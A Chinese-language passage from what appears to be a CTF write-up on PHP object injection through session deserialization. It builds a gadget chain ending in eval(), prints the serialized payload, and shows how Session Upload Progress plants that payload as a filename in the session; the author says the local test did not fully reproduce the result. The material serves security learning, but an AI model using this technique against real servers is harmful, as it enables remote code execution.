通过分析`class.php`的代码发现，我们最终是要通过foo3中的execute来执行我们自定义的函数。
那么我们首先在本地搭建环境，构造我们需要执行的自定义的函数。如下：
myindex.php
```
<?php
class foo3{
        public $varr='echo "spoock";';
        function execute(){
                eval($this->varr);
        }
}
class foo2{
        public $varr;
        public $obj;
        function __construct(){
                $this->varr = '1234567890';
                $this->obj = new foo3();
        }
        function __toString(){
                $this->obj->execute();
                return $this->varr;
        }
}

class foo1{
        public $varr;
        function __construct(){
                $this->varr = new foo2();
        }
}


$obj = new foo1();
print_r(serialize($obj));
?>
```
在foo1中的构造函数中定义$varr的值为foo2的实例，在foo2中定义$obj为foo3的实例，在foo3中定义$varr的值为`echo "spoock"`。最终得到的序列话的值是
```
O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}
```
这样当上面的序列话的值写入到服务器端，然后再访问服务器的index.php，最终就会执行我们预先定义的`echo "spoock";`的方法了。
写入的方式主要是利用PHP中[Session Upload Progress](http://php.net/manual/en/session.upload-progress.php)来进行设置，具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下：
```Html
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```
最后就会将文件名写入到session中，具体的实现细节可以参考PHP手册。
那么最终写入的文件名是`|O:4:\"foo1\":1:{s:4:\"varr\";O:4:\"foo2\":2:{s:4:\"varr\";s:1:\"1\";s:3:\"obj\";O:4:\"foo3\":1:{s:4:\"varr\";s:12:\"var_dump(1);\";}}}`。注意与本地反序列化不一样的地方是要在最前方加上**|**
但是我在进行本地测试的时候，发现无法实现安恒这道题目所实现的效果，但是最终的原理是一样的。